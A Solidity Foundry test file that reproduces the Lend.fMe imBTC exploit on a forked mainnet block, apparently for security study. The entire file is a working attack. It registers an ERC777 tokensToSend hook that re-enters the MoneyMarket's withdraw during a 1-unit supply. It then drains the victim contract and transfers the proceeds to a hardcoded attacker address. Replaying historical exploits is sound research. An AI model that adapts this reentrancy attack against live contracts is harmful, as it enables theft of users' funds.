// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./IERC20.sol";
import "./IERC1820Registry.sol";

interface IMoneyMarket {
    function supply(address asset, uint256 amount) external returns (uint256);

    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
}

// forge test --fork-url wss://eth.drpc.org --fork-block-number 9899725 --match-contract LendfMeExploit -vvv
contract LendfMeExploit is Test {
    address victim = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea; // MoneyMarket
    address attacker = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;
    IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IERC1820Registry erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");

    function tokensToSend(
        address, // operator
        address, // from
        address, // to
        uint256 amount,
        bytes calldata, // userData
        bytes calldata // operatorData
    ) external {
        if (amount == 1) {
            IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);
        }
    }

    function testExploit() public {
        console.log("[Before Attack] Victim imBTC Balance: ", imBTC.balanceOf(victim));
        console.log("[Before Attack] Attacker imBTC Balance: ", imBTC.balanceOf(attacker));

        // prepare
        imBTC.approve(victim, type(uint256).max);
        erc1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));

        // move
        vm.startPrank(attacker);
        imBTC.transfer(address(this), imBTC.balanceOf(attacker));
        vm.stopPrank();

        // attack
        uint256 this_balance = imBTC.balanceOf(address(this));
        uint256 victim_balance = imBTC.balanceOf(victim);
        if (this_balance > (victim_balance + 1)) {
            this_balance = victim_balance + 1;
        }
        IMoneyMarket(victim).supply(address(imBTC), this_balance - 1);
        IMoneyMarket(victim).supply(address(imBTC), 1);
        IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);

        // transfer benefit back to the attacker
        IERC20(imBTC).transfer(attacker, IERC20(imBTC).balanceOf(address(this)));

        console.log("[After Attack] Victim imBTC Balance: ", imBTC.balanceOf(victim));
        console.log("[After Attack] Attacker imBTC Balance: ", imBTC.balanceOf(attacker));
    }
}
